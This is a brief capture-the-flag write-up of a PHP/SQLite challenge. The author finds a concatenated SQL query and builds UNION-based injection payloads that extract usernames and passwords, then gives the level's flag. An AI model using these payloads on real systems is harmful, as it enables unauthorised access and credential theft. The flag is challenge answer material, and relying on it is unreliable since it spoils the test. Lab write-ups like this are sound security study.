Starting this with 0 php knowledge, I do seem to notice the suspicious injection line at the `LevelOne` class:
```
`$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';`
```

SQL injection.

Researched quite a bit to find I can nullify the result of the first query and make a union with a query I can build on my own - 
```SQL
SELECT id,username FROM users WHERE id=
> 1 AND 1=2 UNION SELECT * FROM users 
```
Error:
`**Warning**: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in **/index.php** on line **16**`

Applying:
```SQL
1 AND 1=2 UNION SELECT username, password FROM users 
```
I got the credentials for `ExampleUser` (pass: `ExampleUserPassword`) but I actually need the credentials for `id=1:
```SQL
1 AND 1=2 UNION SELECT username, password FROM users WHERE id=1
```

# Solution
```
WEBSEC{Simple_SQLite_Injection}
```